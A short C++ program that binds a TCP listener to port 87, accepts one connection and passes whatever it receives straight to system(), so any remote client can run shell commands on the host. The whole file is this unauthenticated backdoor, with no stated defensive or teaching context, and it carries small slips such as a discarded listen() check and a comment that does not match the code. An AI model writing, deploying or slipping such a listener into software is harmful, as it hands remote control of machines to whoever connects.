#include<stdio.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<unistd.h>
#include<cstdlib>
#include<iostream>

int main()
{
	int serverSession = socket(AF_INET, SOCK_STREAM, 0);
	if (serverSession < 0)
	{
		std::cerr << "Server socket cannot be created";
		return -1;
	} //was the server socket made? if not return 0.

	//bind the socket to an address
	sockaddr_in address;
	address.sin_family = AF_INET;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons(87);
	
	if (bind(serverSession, (struct sockaddr *)&address, sizeof(address)) < 0)
	{
		std::cerr << "Error: cannot bind session to server.";
		return -2;
	}//if socket cannot be binded to address, end.

	listen(serverSession, 1) < 0;

	int clientSocket = accept(serverSession, nullptr, nullptr);

	char buffer[1024] = { 0 };
	recv(clientSocket, buffer, sizeof(buffer), 0);

	//once the data is received run it into the shell.
	system(buffer);
	return 0;
}
